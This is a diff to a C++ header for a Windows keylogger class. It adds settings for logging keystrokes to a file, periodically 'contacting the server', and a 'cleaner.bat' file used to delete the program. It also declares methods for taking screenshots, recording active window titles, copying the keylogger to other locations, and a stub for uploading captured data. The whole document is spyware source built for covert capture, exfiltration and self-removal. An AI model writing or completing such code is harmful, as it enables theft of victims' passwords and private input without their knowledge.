@@ -22,9 +22,25 @@
 #define SC_RSHIFT 54
 #define SC_SPACE 57
 #define SC_ENTER 28
+#define SC_TAB 15
+#define SC_BACKSPACE 14
+#define SC_CAPSLOCK 58
+#define SC_ESCAPE 1
+
+//key to press in order to destroy the keylogger
+#define HOTKEY_PURGE NULL
 
 //folder to store gathered data
 #define DATADIR "gathered"
+
+//time interval for contacting the server
+#define UPLOAD_DELTA 10
+
+//name of the batch file used for deleting the program
+#define BATCH_NAME "cleaner.bat"
+
+//name of the file receiving key strokes
+#define KEYSTROKES_FILE "keystrokes.txt"
 
 class KeyLogger {
 
@@ -59,6 +75,12 @@ class KeyLogger {
 	//erases program data
 	void purge();
 
+	//loop for standalone usage
+	void loop();
+	
+	//copy the keylogger to another location
+	void copySelf(std::string target);
+
     protected:
 
     KeyLogger();
@@ -68,11 +90,17 @@ class KeyLogger {
 
 	std::string getTimeString();
 
-	void screenshot();
+	std::string screenshot();
 
 	std::string getActiveWindowTitle();
 
+	std::string removeFilespec(std::string path);
+
 	void writeBuffer();
+
+	void upload() {
+		//not implemented yet
+	}
 
 	static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
 
@@ -89,10 +117,13 @@ class KeyLogger {
 
 	std::string programDir;
 	std::string programPath;
+	std::string programName;
 
 	std::string keyboardBuffer;
 
 	std::string activeWindowTitle;
+
+	time_t lastUpload;
 };
 
 #endif // H_KEYLOGGER
